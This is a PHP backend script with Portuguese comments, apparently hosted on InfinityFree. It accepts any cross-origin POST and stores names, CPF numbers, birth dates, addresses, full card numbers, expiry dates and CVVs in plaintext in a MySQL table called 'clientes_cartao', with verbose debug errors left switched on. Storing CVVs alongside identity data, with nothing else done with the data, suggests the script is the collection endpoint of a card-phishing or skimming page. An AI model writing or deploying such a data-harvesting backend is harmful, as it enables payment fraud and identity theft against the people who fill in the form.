<?php
ob_start();
// Ativa a exibição de erros para debug no ambiente de testes
ini_set('display_errors', 1); 
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header("Access-Control-Allow-Origin: *");
header('Content-Type: application/json; charset=utf-8');

// Captura erros fatais e exibe o motivo real no console do navegador
register_shutdown_function(function() {
    $error = error_get_last();
    if ($error !== null && in_array($error['type'], [E_ERROR, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR])) {
        ob_clean();
        http_response_code(500);
        echo json_encode([
            'sucesso' => false,
            'mensagem' => 'Erro fatal no script PHP do servidor.',
            'detalhes' => $error['message'],
            'linha' => $error['line']
        ]);
        exit;
    }
});

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['sucesso' => false, 'mensagem' => 'Método não permitido.']);
    exit;
}

// =========================================================================
// CONFIGURAÇÃO DO INFINITYFREE - COLOQUE SEUS DADOS REAIS REAIS DO PAINEL
// =========================================================================
$db_host = "sqlXXX.infinityfree.com"; // Seu MySQL Hostname do painel
$db_user = "if0_xxxxxxxx";           // Seu MySQL Username do painel
$db_pass = "SuaSenhaAqui";           // Sua senha da conta vshost
$db_name = "if0_xxxxxxxx_db_cartao"; // Nome exato do banco criado lá
// =========================================================================

// Conecta ao banco de dados
$conexao = @new mysqli($db_host, $db_user, $db_pass, $db_name);

if ($conexao->connect_error) {
    http_response_code(500);
    echo json_encode([
        'sucesso' => false, 
        'mensagem' => 'Falha na conexão com o Banco de Dados.',
        'erro_mysql' => $conexao->connect_error
    ]);
    exit;
}
$conexao->set_charset("utf8mb4");

// Captura direta das chaves enviadas pelo JavaScript
$nome            = $_POST['nome'] ?? null;
$email           = $_POST['email'] ?? null;
$telefone        = $_POST['telefone'] ?? null;
$cpf_pessoal     = $_POST['cpf_pessoal'] ?? null;
$data_nascimento = $_POST['data_nascimento'] ?? null;
$cep             = $_POST['cep'] ?? null;
$logradouro      = $_POST['logradouro'] ?? null;
$numero          = $_POST['numero'] ?? null;
$tipo_pagamento  = $_POST['pagamento'] ?? null;
$numero_cartao   = $_POST['cartao'] ?? null;
$validade        = $_POST['validade'] ?? null;
$cvv             = $_POST['cvv'] ?? null;
$nome_cartao     = $_POST['nome_cartao'] ?? null;
$cpf_cartao      = $_POST['cpf_cartao'] ?? null;

// Validação de campos mínimos obrigatórios
if (!$nome || !$email || !$numero_cartao) {
    http_response_code(400);
    echo json_encode([
        'sucesso' => false, 
        'mensagem' => 'Campos obrigatórios ausentes no recebimento do servidor.',
        'diagnostico' => [
            'nome' => $nome ? 'OK' : 'Faltando',
            'email' => $email ? 'OK' : 'Faltando',
            'cartao' => $numero_cartao ? 'OK' : 'Faltando'
        ]
    ]);
    exit;
}

// Prepara a query segura contra SQL Injection
$sql = "INSERT INTO clientes_cartao (nome, email, telefone, cpf_pessoal, data_nascimento, cep, logradouro, numero, tipo_pagamento, numero_cartao, validade, cvv, nome_cartao, cpf_cartao) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
$stmt = $conexao->prepare($sql);

if (!$stmt) {
    http_response_code(500);
    echo json_encode([
        'sucesso' => false, 
        'mensagem' => 'Erro na estrutura ou nome das colunas da tabela clientes_cartao.',
        'erro_mysql' => $conexao->error
    ]);
    exit;
}

$stmt->bind_param("ssssssssssssss", $nome, $email, $telefone, $cpf_pessoal, $data_nascimento, $cep, $logradouro, $numero, $tipo_pagamento, $numero_cartao, $validade, $cvv, $nome_cartao, $cpf_cartao);

if ($stmt->execute()) {
    ob_clean();
    echo json_encode(['sucesso' => true, 'mensagem' => 'Dados salvos com sucesso!']);
} else {
    http_response_code(500);
    ob_clean();
    echo json_encode([
        'sucesso' => false, 
        'mensagem' => 'O banco rejeitou a inserção do registro.',
        'erro_mysql' => $stmt->error
    ]);
}

if ($stmt) { $stmt->close(); }
$conexao->close();
ob_end_flush();
exit;